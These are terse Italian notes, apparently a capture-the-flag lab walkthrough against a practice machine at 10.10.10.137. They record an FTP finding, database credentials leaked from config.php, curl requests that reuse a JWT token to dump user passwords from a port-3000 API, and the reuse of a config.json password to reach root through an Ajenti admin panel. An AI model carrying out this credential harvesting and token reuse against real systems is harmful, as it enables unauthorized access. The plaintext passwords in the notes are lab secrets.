Cosa fare:

1) trovato ftp con file:
lftp 10.10.10.137:/webapp> cat for_Chihiro.txt
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !

Derry

2) trovate credenziali db:
http://10.10.10.137/config.php
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);

3) da vedere porta 3000 e 8000

1) servizio 3000 JWT
2) fare una curl:
3) curl -v -H "Content-Type: application/json" -d '{"username":"admin", "password":"Zk6heYCyv6ZE9Xcg"}' http://10.10.10.137:3000/login
4)
5) curl -H "x-access-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.jSCddVJnTeeEbRwoa97SiCKJPw7zHkE63HwivcG01eM" http://10.10.10.137:3000/
6) curl -H "x-access-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.jSCddVJnTeeEbRwoa97SiCKJPw7zHkE63HwivcG01eM" http://10.10.10.137:3000/users/admin
7) {"name":"Admin","password":"WX5b7)>/rp$U)FW"}
6){"name":"Yuri","password":"bet@tester87"}
7){"name":"Dory","password":"5y:!xa=ybfe)/QD"
10) http://10.10.10.137/management/ 
11) {"name":"Derry","password":"rZ86wwLvx7jUxtch"}
12) in managament/config.json
13) c'è user: root "password": "KpMasng6S5EtTy9Z",
14) Sono le credenziali di ajenti!
15) poi su ajenti, aprire terminale > nuovo terminale e sei root!

